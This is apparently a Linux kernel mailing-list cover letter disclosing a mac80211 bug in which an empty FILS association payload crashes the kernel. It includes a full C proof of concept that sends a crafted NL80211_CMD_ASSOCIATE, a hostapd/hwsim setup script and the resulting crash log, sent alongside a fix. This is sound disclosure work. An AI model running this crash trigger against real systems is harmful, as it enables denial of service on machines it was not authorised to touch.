Received: from mail-pz2-f12.google.com (mail-pz2-f12.google.com [74.125.228.12])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DBF6B361666
	for <stable@vger.kernel.org>; Sat, 19 Sep 2026 08:48:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.12
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789807710; cv=none; b=F0/2UpDgQZc9o8SZVZGqaxj1CAgqo8cuflqT3CE6TDhl63wiYYbwage5tdLYW7nR6llV9g8beh1B3uFqOcywxLnOe6mukMf69o73755C15IicfAp4H15z0M0aiIuEpKX8RHMItgYFQcdNj5uA7FPnS4L35I1UfC7VKnUtmpeqzI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789807710; c=relaxed/simple;
	bh=UVL+8vKQlTMFV3M8uKklKdny6YdxWI+ZPzkNjYbRzfM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=szkpWcsOVQsLYR5hbv1kChlBeHPLSs/Ks0eAx12XUFQ7yawnRFJ8jorkiS/2ayEeZdJKzhYGos6C33inO4xH50AQINsIPIjnXlJGxPt5shK+XwT5rl7TWIE2IN808iFWgH10OriuIpZyqVcQP5HTNd4ZrWcMMm4axTdsZSrbohY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=PBGrsFiK; arc=none smtp.client-ip=74.125.228.12
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="PBGrsFiK"
Received: by mail-pz2-f12.google.com with SMTP id 41be03b00d2f7-cc4c08393b0so1274336a12.0
        for <stable@vger.kernel.org>; Sat, 19 Sep 2026 01:48:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1789807708; x=1790412508; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=53Mow3cqPXOUO/LA8ecZgYbTOCCoydasNI4w52tz/tY=;
        b=PBGrsFiKrM4J1Gg27WVPBn3sUUIBXZYlvEwX3QiKgtbG+MlG+ofY4A1+JiCsLYoxiz
         +r3Jqg9fFumczc6QXxFS1sxc1Oi3+hb+kMvTMeR93v9jI4QWXmHHw66vN/q/ed3hAsMp
         DOvF/2JAGHfyhSuQW/xd11yN+vB8hjzkUukT3GwnhC51Bo4N+3v/0CbhGQ1dAclZCMRs
         h4NC1suB8JPfG9YdNAgtqoZij+eeaNfh4yGOjtUl6qGFMi2KizA85+lBX9/bytY9BsWI
         5MmoJKBvralD9Z2Aa/oSkxI5Aoh0C5Xcu9p4QkyNdfWPN8GI0ZYJm9j4yni/KcfPfTcj
         2ifw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789807708; x=1790412508;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=53Mow3cqPXOUO/LA8ecZgYbTOCCoydasNI4w52tz/tY=;
        b=0ACY+Z15WBdO3nJiPR+41uYbUbBAfxPQ1eChCqMi3Nkf35d6oyuqvb770LeDMPMfHy
         y2Gdz9s2raPBXnW2+RufFpm54atA5nKMBCTuqjHyyV9b3/3+d4EkVnJ9HldGAIspBucr
         izu72cA6c5MJwcYRPKY+F1NAUKgcECFGmRH8ZQIRb0S/3nrHpipfhiW/U3FeZrkFf4jc
         9INIO4Hqp+VUrI1acUMxlDjARMqNAS8zT+72Iau02nXKvQYVS4aRkmtTfXmaBzMBH5ky
         /iv2Br78YWwBOqV120CZOawJbN6gon0ERdbWN6KWVqpDlqIdsUwniVlMn6XAhGHSd1DW
         bFyA==
X-Forwarded-Encrypted: i=1; AKwUvBw2dW2nkh/aWmInLNHkUDi2pzjGBiRvJk9/kq1Znjur9ARufwPS9RlPxcUCFcnjbl+DzeOqAvo=@vger.kernel.org
X-Gm-Message-State: AFuF++kS2jUyO8qhp6kjY/q6xuXGVbNQdfdjU2P4LjoL0nnMQXFWiXG4
	XCM/4LVX/yNIsHiclY2QOsbI30jBCJ0UlqOLl5kuTbsX1UFESmUFhwd47Hh82I4OG+XqZJFO
X-Gm-Gg: AYBFou3+YCrw4EFLjfB+BAw7Gi/Su/xTquklrAY/3v+cafe7ffIb2KS5QmDcG72+cea
	REK/jPwzv0RgHKl9L8TO+93H3ktfjp3Mw0ixf7qRzFvX7+2hvWPGJeDcHjyXlET/loD0hj3DmDZ
	u1pdH8IhopgBSXlEBcR5nF8YagLEma9A1vGz9HjulHjpYBgU8FPnnSClY3Noy0WBRJyoxJAQQUZ
	VO5c4YH7S3p94t2056K0RIcO1sB5CeK9BapnAzBGd0f/WVwBFhS7aqGEf7sSnQGde+jdJTvazC5
	rmzAx96TLVEQ/sI79E6dlFSoJgTYALDecFQdNaJLQ3jo9SYAVTy5fsVgUghnOY8QoI8zonfPqHf
	Ou8cIsv08C9lyVN1mSNXWNld9P+aMH04EQc6lSzI6naGr9xstEUtzhxCy/Sr2q7rCzClfzzhHeE
	OXXDs9I2lFUnZNRRCLh99b8PSb6r0zqOnw17aSfJ8r8oRI1mC3xrKejxbxWzlfBEMJ+ySf7GO4H
	33rDFtiYNbXlC9yt8d/+4lT+7uf9h+hjsfux76qyJbgtkBEb5TVs+D4/aXBFrvn97sd2A==
X-Received: by 2002:a17:90b:48d0:b0:39e:1494:1863 with SMTP id 98e67ed59e1d1-39e54cfa2b3mr9779984a91.25.1789807708124;
        Sat, 19 Sep 2026 01:48:28 -0700 (PDT)
Received: from lenovo-thinkbook (42-2-127-248.static.netvigator.com. [42.2.127.248])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6cb3607csm3566816a91.16.2026.09.19.01.48.25
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 19 Sep 2026 01:48:27 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: linux-wireless@vger.kernel.org
Cc: Johannes Berg <johannes@sipsolutions.net>,
	Jouni Malinen <jouni@qca.qualcomm.com>,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Ren Wei <weir@nebusec.ai>,
	xuyq21@lenovo.com
Subject: [PATCH 0/1] wifi: mac80211: handle empty FILS association request payload
Date: Sat, 19 Sep 2026 16:48:11 +0800
Message-ID: <cover.1789751126.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/mac80211/fils_aead.c.
The reproducer below runs as root in the guest because
NL80211_CMD_ASSOCIATE is gated by GENL_UNS_ADMIN_PERM; the same crash
is reachable from a user and network namespace once a wireless device
has been delegated to it.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

fils_encrypt_assoc_req() encrypts everything that follows the FILS
Session element of a (Re)Association Request frame.  If the FILS
Session element is the last element of the frame, crypt_len is zero
and aes_siv_encrypt() is called with plain_len == 0.

kmemdup() returns ZERO_SIZE_PTR for a zero-length allocation, so
sg_init_one() stores virt_to_page(ZERO_SIZE_PTR) in the scatterlist.
With CONFIG_DEBUG_SG, sg_set_buf() trips BUG_ON(!virt_addr_valid(buf))
and the kernel crashes; without the debug options, an invalid page is
handed to the crypto backend.

The crash happens in the association worker after userspace sends
NL80211_CMD_ASSOCIATE with NL80211_ATTR_IE ending with a FILS Session
element, NL80211_ATTR_FILS_KEK, NL80211_ATTR_FILS_NONCES and the
disable-HT/VHT/HE/EHT flags.

AES-SIV is defined for empty plaintext: the S2V result is the complete
output in that case.  The patch returns it directly and skips the CTR
step, which has nothing to encrypt.

Reproducer:

 cd /root
 make
 ./poc.sh

The PoC needs libnl-genl-3, iw and hostapd.  poc.sh starts an open,
WMM-disabled AP on wlan1 (mac80211_hwsim), brings up wlan0, scans, and
then runs ./poc, which sends NL80211_CMD_ASSOCIATE on wlan0 with the
crafted IE and FILS parameters.

We run the PoC in a 4 vCPU, 4 GB RAM x86 QEMU/KVM environment with
CONFIG_MAC80211_HWSIM, CONFIG_DEBUG_SG and CONFIG_DEBUG_VIRTUAL
enabled.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <errno.h>
#include <linux/if_ether.h>
#include <linux/nl80211.h>
#include <net/if.h>
#include <netlink/attr.h>
#include <netlink/genl/ctrl.h>
#include <netlink/genl/genl.h>
#include <netlink/msg.h>
#include <netlink/netlink.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef WLAN_EID_EXTENSION
#define WLAN_EID_EXTENSION 255
#endif

#ifndef WLAN_EID_EXT_FILS_SESSION
#define WLAN_EID_EXT_FILS_SESSION 4
#endif

#ifndef FILS_NONCE_LEN
#define FILS_NONCE_LEN 16
#endif

static int ack_handler(struct nl_msg *msg, void *arg)
{
	int *err = arg;

	(void)msg;
	*err = 0;
	return NL_STOP;
}

static int finish_handler(struct nl_msg *msg, void *arg)
{
	int *err = arg;

	(void)msg;
	*err = 0;
	return NL_SKIP;
}

static int error_handler(struct sockaddr_nl *nla, struct nlmsgerr *err,
			 void *arg)
{
	int *ret = arg;

	(void)nla;
	*ret = err->error;
	return NL_STOP;
}

static int parse_mac(const char *text, uint8_t mac[ETH_ALEN])
{
	unsigned int bytes[ETH_ALEN];
	int i;

	if (sscanf(text, "%x:%x:%x:%x:%x:%x",
		   &bytes[0], &bytes[1], &bytes[2],
		   &bytes[3], &bytes[4], &bytes[5]) != ETH_ALEN)
		return -1;

	for (i = 0; i < ETH_ALEN; i++) {
		if (bytes[i] > 0xff)
			return -1;
		mac[i] = bytes[i];
	}

	return 0;
}

static int wait_for_reply(struct nl_sock *sock)
{
	struct nl_cb *cb;
	int err = 1;

	cb = nl_cb_alloc(NL_CB_DEFAULT);
	if (!cb) {
		fprintf(stderr, "nl_cb_alloc failed\n");
		return -ENOMEM;
	}

	nl_cb_set(cb, NL_CB_ACK, NL_CB_CUSTOM, ack_handler, &err);
	nl_cb_set(cb, NL_CB_FINISH, NL_CB_CUSTOM, finish_handler, &err);
	nl_cb_err(cb, NL_CB_CUSTOM, error_handler, &err);

	while (err > 0) {
		int rc = nl_recvmsgs(sock, cb);

		if (rc < 0) {
			err = rc;
			break;
		}
	}

	nl_cb_put(cb);
	return err;
}

int main(int argc, char **argv)
{
	static const uint8_t fils_session_ie[] = {
		WLAN_EID_EXTENSION,
		1 + 8,
		WLAN_EID_EXT_FILS_SESSION,
		0x10, 0x32, 0x54, 0x76, 0x98, 0xba, 0xdc, 0xfe,
	};
	uint8_t bssid[ETH_ALEN];
	uint8_t kek[32];
	uint8_t nonces[2 * FILS_NONCE_LEN];
	const char *ifname = argc > 1 ? argv[1] : "wlan0";
	const char *ssid = argc > 2 ? argv[2] : "pocap";
	const char *bssid_text = argc > 3 ? argv[3] : "02:00:00:00:01:00";
	uint32_t freq = argc > 4 ? strtoul(argv[4], NULL, 0) : 2412;
	struct nl_sock *sock = NULL;
	struct nl_msg *msg = NULL;
	int family;
	int ifindex;
	int err;
	size_t ssid_len;
	unsigned int i;

	if (parse_mac(bssid_text, bssid) < 0) {
		fprintf(stderr, "invalid BSSID: %s\n", bssid_text);
		return 1;
	}

	ifindex = if_nametoindex(ifname);
	if (!ifindex) {
		perror("if_nametoindex");
		return 1;
	}

	ssid_len = strlen(ssid);
	if (ssid_len == 0 || ssid_len > 32) {
		fprintf(stderr, "invalid SSID length: %zu\n", ssid_len);
		return 1;
	}

	for (i = 0; i < sizeof(kek); i++)
		kek[i] = 0xa0 + i;
	for (i = 0; i < sizeof(nonces); i++)
		nonces[i] = 0xc0 + i;

	sock = nl_socket_alloc();
	if (!sock) {
		fprintf(stderr, "nl_socket_alloc failed\n");
		return 1;
	}

	if ((err = genl_connect(sock)) < 0) {
		fprintf(stderr, "genl_connect failed: %s\n", nl_geterror(err));
		goto out;
	}

	family = genl_ctrl_resolve(sock, "nl80211");
	if (family < 0) {
		err = family;
		fprintf(stderr, "genl_ctrl_resolve(nl80211) failed: %s\n",
			nl_geterror(err));
		goto out;
	}

	msg = nlmsg_alloc();
	if (!msg) {
		err = -ENOMEM;
		fprintf(stderr, "nlmsg_alloc failed\n");
		goto out;
	}

	if (!genlmsg_put(msg, 0, 0, family, 0, 0, NL80211_CMD_ASSOCIATE, 0)) {
		err = -ENOMEM;
		fprintf(stderr, "genlmsg_put failed\n");
		goto out;
	}

	if (nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
	    nla_put(msg, NL80211_ATTR_SSID, ssid_len, ssid) ||
	    nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, bssid) ||
	    nla_put_u32(msg, NL80211_ATTR_WIPHY_FREQ, freq) ||
	    nla_put(msg, NL80211_ATTR_IE, sizeof(fils_session_ie),
		    fils_session_ie) ||
	    nla_put(msg, NL80211_ATTR_FILS_KEK, sizeof(kek), kek) ||
	    nla_put(msg, NL80211_ATTR_FILS_NONCES, sizeof(nonces), nonces) ||
	    nla_put_flag(msg, NL80211_ATTR_DISABLE_HT) ||
	    nla_put_flag(msg, NL80211_ATTR_DISABLE_VHT) ||
	    nla_put_flag(msg, NL80211_ATTR_DISABLE_HE) ||
	    nla_put_flag(msg, NL80211_ATTR_DISABLE_EHT)) {
		err = -NLE_MSGSIZE;
		fprintf(stderr, "failed to build netlink message\n");
		goto out;
	}

	printf("sending NL80211_CMD_ASSOCIATE on %s to %s (%u MHz)\n",
	       ifname, bssid_text, freq);
	printf("custom IE is a terminal FILS Session element; KEK length=%zu nonce length=%zu\n",
	       sizeof(kek), sizeof(nonces));
	fflush(stdout);

	err = nl_send_auto_complete(sock, msg);
	if (err < 0) {
		fprintf(stderr, "nl_send_auto_complete failed: %s\n",
			nl_geterror(err));
		goto out;
	}

	err = wait_for_reply(sock);
	if (err < 0) {
		fprintf(stderr, "associate request failed before crash: %s (%d)\n",
			nl_geterror(err), err);
		goto out;
	}

	printf("associate request acknowledged; if the kernel did not crash, the bug did not trigger.\n");

out:
	if (msg)
		nlmsg_free(msg);
	if (sock)
		nl_socket_free(sock);

	return err < 0 ? 1 : 0;
}

------END poc.c--------

------BEGIN poc.sh------

#!/bin/sh
set -eu
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

cat > /tmp/hostapd-poc.conf <<'EOF'
interface=wlan1
driver=nl80211
ssid=pocap
hw_mode=g
channel=1
auth_algs=1
wmm_enabled=0
logger_stdout=-1
logger_stdout_level=0
EOF

pkill -x hostapd 2>/dev/null || true
ip link set wlan1 down || true
iw dev wlan1 set type __ap
ip link set wlan1 up
hostapd -B /tmp/hostapd-poc.conf

ip link set wlan0 up
sleep 1
iw dev wlan0 scan >/dev/null

./poc
sleep 5
echo "kernel survived; bug did not trigger"

------END poc.sh--------

-----BEGIN crash log----

[    5.633028] wlan0: associate with 02:00:00:00:01:00 (try 1/3)
[    5.633062] ------------[ cut here ]------------
[    5.633063] kernel BUG at include/linux/scatterlist.h:210!
[    5.633070] Oops: invalid opcode: 0000 [#1] SMP NOPTI
[    5.635896] poc (102) used greatest stack depth: 12512 bytes left
[    5.637417] CPU: 1 UID: 0 PID: 60 Comm: kworker/u16:4 Not tainted 7.3.0-rc2-00458-gfefaac1176bf #1 PREEMPT(lazy) 
[    5.638834] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
[    5.640052] Workqueue: events_unbound cfg80211_wiphy_work
[    5.640831] RIP: 0010:sg_init_one+0x7f/0x90
[    5.641427] Code: 75 2a 48 8b 13 f6 c2 01 75 25 83 e2 03 81 e5 ff 0f 00 00 44 89 63 0c 48 09 c2 89 6b 08 48 89 13 5b 5d 41 5c e9 cd a5 83 ff 90 <0f> 0b 90 0f 0b 90 0f 0b 66 0f 1f 84 00 00 00 00 00 90 90 90 90 90
[    5.644008] RSP: 0018:ffffa33f8020fc18 EFLAGS: 00010246
[    5.644748] RAX: 0000000000000000 RBX: ffffa33f8020fc48 RCX: 0000000000000034
[    5.645754] RDX: 0000000000000000 RSI: 0000000000000010 RDI: 0000000080000010
[    5.646728] RBP: 0000000000000010 R08: 00000000ffffffff R09: 0000000000000010
[    5.647719] R10: ffff949c0032d180 R11: ffff949c018b89e0 R12: 0000000000000000
[    5.648714] R13: 0000000000000000 R14: ffff949c003a2600 R15: ffff949c0024f9fe
[    5.649711] FS:  0000000000000000(0000) GS:ffff949c91ff4000(0000) knlGS:0000000000000000
[    5.650842] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.651653] CR2: 0000563a780809b8 CR3: 0000000067a30000 CR4: 0000000000750ef0
[    5.652637] PKRU: 55555554
[    5.653019] Call Trace:
[    5.653385]  <TASK>
[    5.653720]  aes_siv_encrypt.constprop.0+0x17d/0x220
[    5.654429]  fils_encrypt_assoc_req+0x1a2/0x1f0
[    5.655081]  ieee80211_sta_work.cold+0x696/0x929
[    5.655736]  ? pick_task_fair+0x2f6/0x780
[    5.656313]  cfg80211_wiphy_work+0xac/0x190
[    5.656901]  process_one_work+0x197/0x390
[    5.657483]  worker_thread+0x169/0x2d0
[    5.658015]  ? __pfx_worker_thread+0x10/0x10
[    5.658662]  kthread+0xe1/0x120
[    5.659116]  ? __pfx_kthread+0x10/0x10
[    5.659668]  ret_from_fork+0x177/0x240
[    5.660202]  ? __pfx_kthread+0x10/0x10
[    5.660758]  ret_from_fork_asm+0x1a/0x30
[    5.661333]  </TASK>
[    5.661672] Modules linked in:
[    5.662140] ---[ end trace 0000000000000000 ]---

-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (1):
  wifi: mac80211: handle empty FILS association request payload

 net/mac80211/fils_aead.c | 8 ++++++++
 1 file changed, 8 insertions(+)


base-commit: fefaac1176bf3cf002a8dc83339d6ed6a369941a
-- 
2.55.0

